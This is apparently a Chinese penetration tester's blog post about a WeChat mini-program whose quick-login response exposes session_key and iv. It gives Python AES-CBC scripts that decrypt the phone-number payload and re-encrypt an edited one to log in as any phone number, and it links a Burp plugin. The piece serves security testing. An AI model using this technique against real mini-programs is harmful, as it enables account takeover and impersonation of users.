---
layout:     post
title:    wx小程序session_key利用插件
subtitle:   burp插件
date:       2020-08-04
author:     hmoytx
header-img: img/bg_02.jpg
catalog: true
tags:
    - 渗透测试
    - 工具
    
    
    
---
# wx小程序session_key利用插件

## 开头
学习Poc Sir老师傅的微信小程序渗透五脉，最近在测试的过程种发现了一例快捷登录存在问题的小程序，要进行加解密，写了一个简单的burp插件，方便后续的工作。  
具体的原理这里不再进一步赘述。有兴趣的可以去看雷神众测的文章。  


## 中间
测试的时候发现一个小程序，能快捷登陆。  
![200804_1](/img/200804_login.jpg)   
抓登陆的包可以看到，啥都给出来的，显然存在问题，可以进行解密，篡改。  
![200804_2](/img/200804_logindata.jpg)  
然后来尝试加解密。  

## 加解密代码
在获取到session_key，以及iv的情况下，直接可以进行解密：  
```
#!python
#!/usr/bin/env python
# -*- coding:utf-8 -*-

import base64
from Crypto.Cipher import *


def decrypt(enStr, key, iv):
        cipher = AES.new(key, AES.MODE_CBC, iv)
        msg = cipher.decrypt(enStr)
        paddingLen = ord(msg[len(msg)-1])
        return msg[0:-paddingLen]


def decryptData(encryptedData, iv, sessionKey):
	aesIV = base64.b64decode(iv)
	aesCipher = base64.b64decode(encryptedData)
	aesKey = base64.b64decode(sessionKey)
	return decrypt(aesCipher, aesKey, aesIV)


if __name__ == '__main__':
	print decryptData(data, iv, sessionkey)
```
得到的结果格式如下：  
```
{
    "phoneNumber": "+85259883333",
    "purePhoneNumber": "59883333",
    "countryCode": "852",
    "watermark":
    {
        "appid":"APPID",
        "timestamp": TIMESTAMP
    }
}
```  
解密的结果：  
![200804_3](/img/200804_decrypt.jpg)  
然后可以对其进行修改后进行伪造，完成任意手机号码登陆。  
加密的代码：  
```
#!python
#!/usr/bin/env python
# -*- coding:utf-8 -*-

import base64
from Crypto.Cipher import AES


def encrypt(str, key, iv):
    cipher = AES.new(key, AES.MODE_CBC,iv)
    x = 16 - (len(str) % 16)
    if x != 0:
        str = str + chr(x)*x
    msg = base64.b64encode(cipher.encrypt(str))
    return msg

def encryptData(decryptedData, iv, sessionKey):
	aesIV = base64.b64decode(iv)
	aesKey = base64.b64decode(sessionKey) 
	return encrypt(decryptedData, aesKey, aesIV)

if __name__ == '__main__':
	print encryptData(data, iv, sessionKey)
```   
然后将得到的结果替换报文原来的加密内容。（这里是一次性有效的，无论成功与否）  


## 插件
简单的写了个burp的插件。  
![200804_4](/img/200804_burp.jpg)  
存在问题可以及时联系，或者自行修改
项目地址:[https://github.com/hmoytx/bp_miniprogram_decrypt](https://github.com/hmoytx/bp_miniprogram_decrypt)  

## 参考
[https://www.hackinn.com/index.php/archives/672/](https://www.hackinn.com/index.php/archives/672/)


